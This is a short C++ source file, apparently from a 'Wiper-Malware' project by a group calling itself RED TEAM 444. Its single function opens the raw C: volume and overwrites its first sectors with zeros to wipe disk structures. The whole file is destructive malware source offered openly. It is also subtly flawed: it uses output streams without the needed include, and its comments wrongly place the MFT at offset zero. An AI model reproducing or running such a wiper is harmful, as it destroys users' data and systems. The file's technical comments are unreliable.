/*RED TEAM 444
  author : U0lEREhBTlQ=
  https://github.com/RED-TEAM-444/Wiper-Malware.git
*/

#include <windows.h>

// Function to erase MFT records (rudimentary example, requires raw disk access)
void eraseMFTRecords() {
    HANDLE hDrive = CreateFileA("\\\\.\\C:", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    
    if (hDrive == INVALID_HANDLE_VALUE) {
        std::cerr << "Error opening drive for MFT wiping.\n";
        return;
    }

    // Buffer to write zeros (or random data) to MFT
    char buffer[512] = {0};  // Normally we would use more sophisticated data here

    DWORD bytesWritten;
    LARGE_INTEGER sectorOffset;
    sectorOffset.QuadPart = 0;  // MFT starts early in the NTFS file system (for testing)
    
    if (!SetFilePointerEx(hDrive, sectorOffset, NULL, FILE_BEGIN)) {
        std::cerr << "Error setting file pointer for MFT erase.\n";
    }
    
    // Erase the first few sectors of the MFT
    for (int i = 0; i < 10; ++i) {
        if (!WriteFile(hDrive, buffer, sizeof(buffer), &bytesWritten, NULL)) {
            std::cerr << "Error writing to drive for MFT erase.\n";
            break;
        }
    }

    CloseHandle(hDrive);
    std::cout << "MFT records wiped.\n";
}
